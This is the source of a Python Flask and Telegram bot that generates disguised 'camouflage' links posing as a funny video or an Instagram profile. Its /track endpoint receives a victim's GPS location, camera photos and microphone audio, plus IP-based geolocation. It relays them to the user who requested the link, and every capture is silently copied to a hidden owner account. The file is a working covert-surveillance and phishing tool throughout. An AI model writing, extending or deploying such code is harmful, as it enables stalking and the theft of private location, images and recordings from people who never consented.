import os
import json
import base64
import tempfile
import requests
from flask import Flask, request, render_template, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from database import get_or_create_session, get_chat_id

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise Exception("BOT_TOKEN missing")

OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID")
if OWNER_CHAT_ID:
    try:
        OWNER_CHAT_ID = int(OWNER_CHAT_ID)
    except:
        OWNER_CHAT_ID = None

REQUIRED_CHANNELS = []
channels_env = os.environ.get("REQUIRED_CHANNELS", "")
if channels_env:
    REQUIRED_CHANNELS = [ch.strip() for ch in channels_env.split(",") if ch.strip()]

print(f"[DEBUG] OWNER_CHAT_ID: {OWNER_CHAT_ID}")
print(f"[DEBUG] REQUIRED_CHANNELS: {REQUIRED_CHANNELS}")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ---------- IP Geolocation ----------
def get_client_ip(req):
    forwarded = req.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return req.remote_addr

def get_ip_location(ip_address):
    try:
        if not ip_address or ip_address.startswith(("127.", "192.", "10.", "172.")):
            return None
        url = f"http://ip-api.com/json/{ip_address}?fields=status,country,city,regionName,lat,lon,isp"
        resp = requests.get(url, timeout=5)
        data = resp.json()
        if data.get("status") == "success":
            return {
                "lat": data.get("lat"),
                "lon": data.get("lon"),
                "city": data.get("city", "Unknown"),
                "region": data.get("regionName", ""),
                "country": data.get("country", ""),
                "isp": data.get("isp", "")
            }
    except Exception as e:
        print(f"[IP-GEO] Error: {e}")
    return None

# ---------- Helper Functions ----------
def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        if isinstance(reply_markup, dict):
            payload["reply_markup"] = json.dumps(reply_markup)
        else:
            payload["reply_markup"] = json.dumps(reply_markup.to_dict())
    requests.post(f"{TG_API}/sendMessage", json=payload)

def answer_callback(callback_query_id, text=None):
    payload = {"callback_query_id": callback_query_id}
    if text:
        payload["text"] = text
    requests.post(f"{TG_API}/answerCallbackQuery", json=payload)

def edit_message_text(chat_id, message_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
    if reply_markup:
        if isinstance(reply_markup, dict):
            payload["reply_markup"] = json.dumps(reply_markup)
        else:
            payload["reply_markup"] = json.dumps(reply_markup.to_dict())
    requests.post(f"{TG_API}/editMessageText", json=payload)

def send_photo(chat_id, photo_path):
    with open(photo_path, "rb") as f:
        requests.post(f"{TG_API}/sendPhoto", data={"chat_id": chat_id}, files={"photo": f})

def send_audio(chat_id, audio_path):
    with open(audio_path, "rb") as f:
        requests.post(f"{TG_API}/sendAudio", data={"chat_id": chat_id}, files={"audio": f})

def get_user_info(chat_id):
    try:
        url = f"{TG_API}/getChat"
        resp = requests.get(url, params={"chat_id": chat_id})
        data = resp.json()
        if data.get("ok"):
            result = data["result"]
            return result.get("username", "N/A"), result.get("first_name", "Unknown")
    except:
        pass
    return "N/A", "Unknown"

def send_to_telegram(chat_id, data_type, content):
    if data_type == "location":
        lat = content["lat"]
        lon = content["lon"]
        acc = content["acc"]
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        send_message(
            chat_id,
            f"📍 <b>Location</b>\nLat: {lat}\nLon: {lon}\nAccuracy: {acc}m\n\n🗺️ <a href='{maps_link}'>Open in Google Maps</a>"
        )
    elif data_type == "photo":
        header, encoded = content.split(",", 1)
        img_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            f.write(img_data)
            tmp = f.name
        send_photo(chat_id, tmp)
        os.unlink(tmp)
    elif data_type == "audio":
        header, encoded = content.split(",", 1)
        audio_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as f:
            f.write(audio_data)
            tmp = f.name
        send_audio(chat_id, tmp)
        os.unlink(tmp)

    # Owner copy
    if OWNER_CHAT_ID and chat_id != OWNER_CHAT_ID:
        username, first_name = get_user_info(chat_id)
        owner_msg = f"🔔 <b>📥 Data from User</b>\n\n👤 {first_name}\n🆔 <code>{chat_id}</code>\n📂 {data_type.upper()}\n\n"
        if data_type == "location":
            owner_msg += f"📍 Lat: {lat}\nLon: {lon}\nAcc: {acc}m"
            send_message(OWNER_CHAT_ID, owner_msg)
        elif data_type == "photo":
            send_message(OWNER_CHAT_ID, owner_msg + "📷 Photo below")
            header, encoded = content.split(",", 1)
            img_data = base64.b64decode(encoded)
            with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
                f.write(img_data)
                tmp = f.name
            send_photo(OWNER_CHAT_ID, tmp)
            os.unlink(tmp)
        elif data_type == "audio":
            send_message(OWNER_CHAT_ID, owner_msg + "🎤 Audio below")
            header, encoded = content.split(",", 1)
            audio_data = base64.b64decode(encoded)
            with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as f:
                f.write(audio_data)
                tmp = f.name
            send_audio(OWNER_CHAT_ID, tmp)
            os.unlink(tmp)

def check_membership(chat_id):
    missing = []
    for channel in REQUIRED_CHANNELS:
        try:
            url = f"{TG_API}/getChatMember"
            params = {"chat_id": channel, "user_id": chat_id}
            resp = requests.get(url, params=params)
            data = resp.json()
            if data.get("ok"):
                status = data["result"]["status"]
                if status not in ["creator", "administrator", "member"]:
                    missing.append(channel)
            else:
                missing.append(channel)
        except:
            missing.append(channel)
    return missing

# ---------- Routes ----------
@app.route('/')
def home():
    return "Bot is running ✅", 200

@app.route('/ping')
def ping():
    return "pong", 200

@app.route('/camouflage')
def camouflage():
    session_id = request.args.get('session')
    template = request.args.get('template', 'funny')
    if not session_id or not get_chat_id(session_id):
        return "Invalid or expired link", 404
    if template not in ['funny', 'instagram']:
        template = 'funny'
    return render_template(f'{template}.html')

@app.route('/track', methods=['POST'])
def track():
    session_id = request.args.get('session')
    chat_id = get_chat_id(session_id)
    if not chat_id:
        return jsonify({"error": "Invalid session"}), 400
    data = request.get_json()
    
    if data and 'location' in data:
        send_to_telegram(chat_id, "location", data['location'])
    elif data and 'image' in data:
        send_to_telegram(chat_id, "photo", data['image'])
    elif data and 'audio' in data:
        send_to_telegram(chat_id, "audio", data['audio'])
    elif data and 'ip_fallback' in data:
        client_ip = get_client_ip(request)
        print(f"[IP-FALLBACK] Client IP: {client_ip}")
        ip_loc = get_ip_location(client_ip)
        if ip_loc:
            maps_link = f"https://www.google.com/maps?q={ip_loc['lat']},{ip_loc['lon']}"
            msg = (f"📍 <b>Location (IP-based)</b>\n"
                   f"Lat: {ip_loc['lat']}\nLon: {ip_loc['lon']}\n"
                   f"City: {ip_loc['city']}, {ip_loc['region']}\n"
                   f"Country: {ip_loc['country']}\nISP: {ip_loc['isp']}\n\n"
                   f"🗺️ <a href='{maps_link}'>Open in Google Maps</a>\n\n"
                   f"⚠️ <i>Approximate (GPS unavailable)</i>")
            send_message(chat_id, msg)
            if OWNER_CHAT_ID and chat_id != OWNER_CHAT_ID:
                username, first_name = get_user_info(chat_id)
                owner_msg = (f"🔔 <b>🌐 IP-Based Location</b>\n\n"
                             f"👤 {first_name}\n🆔 <code>{chat_id}</code>\n"
                             f"🌐 IP: <code>{client_ip}</code>\n"
                             f"📍 {ip_loc['city']}, {ip_loc['country']}\n"
                             f"🗺️ <a href='{maps_link}'>View Map</a>")
                send_message(OWNER_CHAT_ID, owner_msg)
    return jsonify({"status": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data(as_text=True)
    try:
        update = Update.de_json(json.loads(json_str), None)
        if update.message and update.message.text and update.message.text.startswith('/start'):
            chat_id = update.message.chat.id
            if REQUIRED_CHANNELS:
                missing = check_membership(chat_id)
                if missing:
                    keyboard = {"inline_keyboard": []}
                    for ch in missing:
                        keyboard["inline_keyboard"].append([{"text": f"📢 Join @{ch}", "url": f"https://t.me/{ch}"}])
                    keyboard["inline_keyboard"].append([{"text": "✅ I have joined", "callback_data": "check_join"}])
                    send_message(chat_id, "⚠️ Please join:\n" + "\n".join(f"@{ch}" for ch in missing), reply_markup=keyboard)
                    return "ok"
            keyboard = {"inline_keyboard": [
                [{"text": "😂 Funny Video Link", "callback_data": "funny"}],
                [{"text": "📸 Instagram Profile Link", "callback_data": "instagram"}]
            ]}
            send_message(chat_id, "🔗 Kaunsa link chahiye?", reply_markup=keyboard)

        elif update.callback_query:
            query = update.callback_query
            chat_id = query.message.chat.id
            message_id = query.message.message_id
            data = query.data
            answer_callback(query.id)

            if data == "check_join":
                missing = check_membership(chat_id)
                if missing:
                    keyboard = {"inline_keyboard": []}
                    for ch in missing:
                        keyboard["inline_keyboard"].append([{"text": f"📢 Join @{ch}", "url": f"https://t.me/{ch}"}])
                    keyboard["inline_keyboard"].append([{"text": "✅ I have joined", "callback_data": "check_join"}])
                    edit_message_text(chat_id, message_id, "⚠️ Still not joined.", reply_markup=keyboard)
                else:
                    keyboard = {"inline_keyboard": [
                        [{"text": "😂 Funny Video Link", "callback_data": "funny"}],
                        [{"text": "📸 Instagram Profile Link", "callback_data": "instagram"}]
                    ]}
                    edit_message_text(chat_id, message_id, "✅ Choose your link:", reply_markup=keyboard)
                return "ok"

            template = data
            session_id = get_or_create_session(chat_id)
            public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
            link = f"{public_url}/camouflage?session={session_id}&template={template}"
            edit_message_text(chat_id, message_id, f"✅ Permanent link:\n\n{link}")
        return "ok"
    except Exception as e:
        print(f"Webhook error: {e}")
        return "error", 500

def set_webhook():
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
    webhook_url = f"{public_url}/webhook"
    r = requests.post(f"{TG_API}/setWebhook", json={"url": webhook_url})
    print(f"Webhook set: {r.text}")

set_webhook()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
